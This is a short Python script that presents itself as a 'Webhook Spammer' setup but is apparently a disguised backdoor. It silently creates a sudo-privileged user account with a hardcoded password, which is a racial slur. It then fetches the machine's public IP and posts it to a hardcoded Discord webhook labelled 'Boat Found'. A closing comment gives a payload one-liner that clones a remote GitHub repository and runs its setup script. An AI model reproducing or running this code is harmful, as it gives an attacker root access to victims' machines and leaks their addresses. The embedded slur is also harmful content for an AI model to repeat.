import os
import sys
import subprocess
import requests
print("Setting Up Webhook Spammer....")

subprocess.run("adduser dolphin -p nigger")
subprocess.run("usermod -aG sudo dolphin")
r = requests.get("https://api.my-ip.io/ip.json")
rr = r.json()
ip = rr["ip"]


from discord_webhook import DiscordWebhook, DiscordEmbed
webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/780269694527078400/53QsAo_53qjCYhwJudrzzTcbVDtZgcmKqKboDWvndmoe3DcXD0pMCVHDyojmyjEceVNy")
    
embed = DiscordEmbed(title='Boat Found', description=f'{ip} ', color=0xff0000)
webhook.add_embed(embed)
    
webhook.execute()


#payload "apt update | apt upgrade | git clone https://github.com/sexyman2343/sexmaster | cd sexmaster | apt install python3 | apt install python3-pip | apt install wget | pip3 install -r /root/sexmaster/requirements.txt | python3 setup.py | clear | echo Setup done 
